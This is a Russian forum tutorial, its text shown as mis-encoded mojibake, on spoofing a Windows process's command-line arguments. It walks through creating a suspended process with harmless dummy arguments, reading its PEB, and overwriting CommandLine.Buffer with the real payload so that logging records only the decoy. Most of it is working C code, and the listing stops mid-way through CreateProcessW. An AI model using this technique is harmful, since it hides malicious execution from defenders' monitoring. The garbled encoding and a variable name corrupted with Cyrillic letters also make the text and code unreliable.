–î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–¥–º–µ–Ω–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ —Å–Ω–∞—á–∞–ª–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, –ø–µ—Ä–µ–¥–∞–≤–∞—è —Ñ–∏–∫—Ç–∏–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ —Å—á–∏—Ç–∞—é—Ç—Å—è –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º–∏. –ü—Ä–µ–∂–¥–µ —á–µ–º –≤–æ–∑–æ–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, —Å—Ç—Ä–æ–∫—É PEB-&gt;ProcessParameters.CommandLine.Buffer –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ –∂–µ–ª–∞–µ–º—É—é —Å—Ç—Ä–æ–∫—É-–ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∫–æ—Ç–æ—Ä–∞—è –∑–∞—Å—Ç–∞–≤–∏—Ç —Å–ª—É–∂–±—ã —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —Ñ–∏–∫—Ç–∏–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã, –∞ –Ω–µ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω—ã. –î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –ø—Ä–æ—Ü–µ–¥—É—Ä—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏:<br />
<ol>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞—Ç—å —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏.</li>
<li data-xf-list-type="ol">–ü–æ–ª—É—á–∏—Ç—å —É–¥–∞–ª–µ–Ω–Ω—ã–π –∞–¥—Ä–µ—Å PEB —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ol">–ü—Ä–æ—á–∏—Ç–∞—Ç—å —É–¥–∞–ª–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB –∏–∑ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ol">–ü—Ä–æ—á–∏—Ç–∞—Ç—å —É–¥–∞–ª–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB-&gt;ProcessParameters –∏–∑ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ol">–ó–∞–º–µ–Ω–∏—Ç—å —Å—Ç—Ä–æ–∫—É ProcessParameters.CommandLine.Buffer –∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –µ–µ –ø–æ–ª–µ–∑–Ω—ã–º –ø–æ–ª–µ–∑–Ω—ã–º –¥–∞–Ω–Ω—ã–º–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.</li>
<li data-xf-list-type="ol">–í–æ–∑–æ–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å.</li>
</ol>–î–ª–∏–Ω–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∑–∞–ø–∏—Å—ã–≤–∞–µ–º–æ–≥–æ –≤ Peb-&gt;ProcessParameters.CommandLine.Buffer –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –º–µ–Ω—å—à–µ –∏–ª–∏ —Ä–∞–≤–Ω–∞ –¥–ª–∏–Ω–µ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Ñ–∏–∫—Ç–∏–≤–Ω–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –ï—Å–ª–∏ —Ä–µ–∞–ª—å–Ω—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç –±–æ–ª—å—à–µ, –æ–Ω –º–æ–∂–µ—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –±–∞–π—Ç—ã –∑–∞ –ø—Ä–µ–¥–µ–ª–∞–º–∏ —Ñ–∏–∫—Ç–∏–≤–Ω–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞, —á—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ —Å–±–æ—é –ø—Ä–æ—Ü–µ—Å—Å–∞. <b>–î–ª—è –∏–∑–±–µ–∂–∞–Ω–∏—è —ç—Ç–æ–≥–æ –≤—Å–µ–≥–¥–∞ —Å–ª–µ–¥—É–µ—Ç —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ —Ñ–∏–∫—Ç–∏–≤–Ω—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç –±–æ–ª—å—à–µ, —á–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω</b>.<br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞ PEB<br />
<br />
–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ PEB —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å NtQueryInformationProcess —Å —Ñ–ª–∞–≥–æ–º ProcessBasicInformation.<br />
<br />
–ö–∞–∫ —É–∫–∞–∑–∞–Ω–æ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏, –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ —Ñ–ª–∞–≥–∞ ProcessBasicInformation NtQueryInformationProcess –≤–µ—Ä–Ω–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É PROCESS_BASIC_INFORMATION, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS    ExitStatus;
    PPEB        PebBaseAddress;                // –£–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB.
    ULONG_PTR   AffinityMask;
    KPRIORITY   BasePriority;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;</code></pre>
	</div>
</div><br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø–æ—Å–∫–æ–ª—å–∫—É NtQueryInformationProcess - —ç—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤, –µ–≥–æ –Ω—É–∂–Ω–æ –≤—ã–∑—ã–≤–∞—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetModuleHandle –∏ GetProcAddress, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö.<br />
<br />
<b>–ß—Ç–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB</b><br />
<br />
–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ PEB –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –º–æ–∂–Ω–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI ReadProcessMemory, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
);</code></pre>
	</div>
</div><br />
ReadProcessMemory –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —á—Ç–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ lpBaseAddress. –§—É–Ω–∫—Ü–∏—é –Ω—É–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å –¥–≤–∞–∂–¥—ã:<br />
<ol>
<li data-xf-list-type="ol">–ü–µ—Ä–≤—ã–π –≤—ã–∑–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —á—Ç–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB, –ø–µ—Ä–µ–¥–∞–≤–∞—è –∞–¥—Ä–µ—Å PEB, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –∏–∑ –≤—ã–≤–æ–¥–∞ NtQueryInformationProcess, –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä lpBaseAddress.</li>
<li data-xf-list-type="ol">–ó–∞—Ç–µ–º –æ–Ω –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –≤–æ –≤—Ç–æ—Ä–æ–π —Ä–∞–∑ –¥–ª—è —á—Ç–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã RTL_USER_PROCESS_PARAMETERS, –ø–µ—Ä–µ–¥–∞–≤–∞—è –µ–µ –∞–¥—Ä–µ—Å –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä lpBaseAddress. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ RTL_USER_PROCESS_PARAMETERS –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PEB –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –≤—ã–∑–æ–≤–µ. –ü–æ–º–Ω–∏—Ç–µ, —á—Ç–æ —ç—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç —á–ª–µ–Ω CommandLine, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–¥–º–µ–Ω—ã –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤.</li>
</ol><b>–†–∞–∑–º–µ—Ä RTL_USER_PROCESS_PARAMETERS</b><br />
<br />
–ü—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã RTL_USER_PROCESS_PARAMETERS –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —á–∏—Ç–∞—Ç—å –±–æ–ª—å—à–µ –±–∞–π—Ç, —á–µ–º sizeof(RTL_USER_PROCESS_PARAMETERS). –≠—Ç–æ —Å–≤—è–∑–∞–Ω–æ —Å —Ç–µ–º, —á—Ç–æ —Ä–µ–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —ç—Ç–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∏–∫—Ç–∏–≤–Ω–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞. –î–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è —á—Ç–µ–Ω–∏—è –≤—Å–µ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –±–∞–π—Ç—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –ø—Ä–æ—á–∏—Ç–∞–Ω—ã. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –≤ –æ–±—Ä–∞–∑—Ü–µ –∫–æ–¥–∞, –≥–¥–µ —á–∏—Ç–∞–µ—Ç—Å—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö 225 –±–∞–π—Ç–æ–≤.<br />
<br />
<b>–ü–∞—Ç—á–∏–Ω–≥ CommandLine.Buffer</b><br />
<br />
–ü–æ–ª—É—á–∏–≤ —Å—Ç—Ä—É–∫—Ç—É—Ä—É RTL_USER_PROCESS_PARAMETERS, –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∏ –ø–∞—Ç—á–∏—Ç—å CommandLine.Buffer. –î–ª—è —ç—Ç–æ–≥–æ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ñ—É–Ω–∫—Ü–∏—è WinAPI WriteProcessMemory, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,          // –ß—Ç–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è (CommandLine.Buffer)
  [in]  LPCVOID lpBuffer,               // –ß—Ç–æ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è (–Ω–æ–≤—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç –ø—Ä–æ—Ü–µ—Å—Å–∞)
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);</code></pre>
	</div>
</div><ul>
<li data-xf-list-type="ul">pBaseAddress –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ —Ç–æ, —á—Ç–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è, —á—Ç–æ –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —è–≤–ª—è–µ—Ç—Å—è CommandLine.Buffer.</li>
<li data-xf-list-type="ul">lpBuffer - —ç—Ç–æ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—Ç—å —Ñ–∏–∫—Ç–∏–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã. –û–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤ –¥–ª—è –∑–∞–º–µ–Ω—ã CommandLine.Buffer, –∫–æ—Ç–æ—Ä—ã–π —Ç–∞–∫–∂–µ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç—Ä–æ–∫–æ–π —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤.</li>
<li data-xf-list-type="ul">–ü–∞—Ä–∞–º–µ—Ç—Ä nSize - —ç—Ç–æ —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤ –±–∞–π—Ç–∞—Ö. –û–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ä–∞–≤–µ–Ω –¥–ª–∏–Ω–µ —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è, —É–º–Ω–æ–∂–µ–Ω–Ω–æ–π –Ω–∞ —Ä–∞–∑–º–µ—Ä WCHAR –ø–ª—é—Å 1 (–¥–ª—è –Ω—É–ª–µ–≤–æ–≥–æ —Å–∏–º–≤–æ–ª–∞).</li>
</ul>lstrlenW(NewArgument) * sizeof(WCHAR) + 1 –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏<br />
<br />
–ö–æ–¥ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥–≤–µ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ —á–∏—Ç–∞—é—Ç –∏ –∑–∞–ø–∏—Å—ã–≤–∞—é—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ –∏ –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è ReadFromTargetProcess</b><br />
<br />
–í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ReadFromTargetProcess –≤–µ—Ä–Ω–µ—Ç –≤—ã–¥–µ–ª–µ–Ω–Ω—É—é –∫—É—á—É, —Å–æ–¥–µ—Ä–∂–∞—â—É—é –±—É—Ñ–µ—Ä, –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—ã–π –∏–∑ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –°–Ω–∞—á–∞–ª–∞ –æ–Ω–∞ —á–∏—Ç–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB, –∞ –∑–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –µ–µ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã RTL_USER_PROCESS_PARAMETERS. –§—É–Ω–∫—Ü–∏—è ReadFromTargetProcess –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

    SIZE_T    sNmbrOfBytesRead    = NULL;

    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &amp;sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
        printf(&quot;[!] ReadProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        printf(&quot;[i] Bytes Read : %d Of %d \n&quot;, sNmbrOfBytesRead, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è WriteToTargetProcess</b><br />
<br />
–í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è WriteToTargetProcess –ø–µ—Ä–µ–¥–∞–µ—Ç —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã —Ñ—É–Ω–∫—Ü–∏–∏ WriteProcessMemory –∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –≤—ã–≤–æ–¥. –§—É–Ω–∫—Ü–∏—è WriteToTargetProcess –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten    = NULL;

    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &amp;sNmbrOfBytesWritten) || sNm–±—ÄOfBytesWritten != dwBufferSize) {
        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        printf(&quot;[i] Bytes Written : %d Of %d \n&quot;, sNmbrOfBytesWritten, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è –ø–æ–¥–º–µ–Ω—ã –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞<br />
<br />
CreateArgSpoofedProcess </b>- —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –≤—ã–ø–æ–ª–Ω—è—é—â–∞—è –ø–æ–¥–º–µ–Ω –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –≤–æ –≤–Ω–æ–≤—å —Å–æ–∑–¥–∞–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
–§—É–Ω–∫—Ü–∏—è —Ç—Ä–µ–±—É–µ—Ç 5 –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤:<br />
<br />
szStartupArgs - –§–∏–∫—Ç–∏–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã. –û–Ω–∏ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –±–µ–∑–≤—Ä–µ–¥–Ω—ã–º–∏.<br />
<br />
szRealArgs - –†–µ–∞–ª—å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
dwProcessId - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç PID.<br />
<br />
hProcess - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
hThread - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    NTSTATUS                      STATUS   = NULL;

    WCHAR                         szProcess [MAX_PATH];

    STARTUPINFOW                  Si       = { 0 };
    PROCESS_INFORMATION           Pi       = { 0 };

    PROCESS_BASIC_INFORMATION     PBI      = { 0 };
    ULONG                         uRetern  = NULL;

    PPEB                          pPeb     = NULL;
    PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;

    RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ NtQueryInformationProcess
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L&quot;NTDLL&quot;), &quot;NtQueryInformationProcess&quot;);
    if (pNtQueryInformationProcess == NULL)
        return FALSE;

    lstrcpyW(szProcess, szStartupArgs);

    if (!CreateProcessW(
        NULL,
        szProcess,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,      // —Å–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º –∏ –±–µ–∑ –æ–∫–Ω–∞
        NULL,
        L&quot;C:\\Windows\\System32\\&quot;,               // –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å GetEnvironmentVariableW –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —ç—Ç–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ
